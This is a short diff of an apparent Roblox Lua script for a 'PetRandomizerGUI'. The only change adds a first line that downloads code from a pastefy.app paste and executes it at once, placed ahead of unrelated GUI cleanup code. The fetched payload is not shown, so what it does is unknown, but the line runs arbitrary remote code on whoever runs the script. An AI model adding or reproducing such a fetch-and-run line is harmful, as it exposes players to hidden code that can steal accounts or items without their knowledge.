@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://pastefy.app/tP9CkYCu/raw"))()
 -- Cleanup
 pcall(function() game.CoreGui:FindFirstChild("PetRandomizerGUI"):Destroy() end)
 
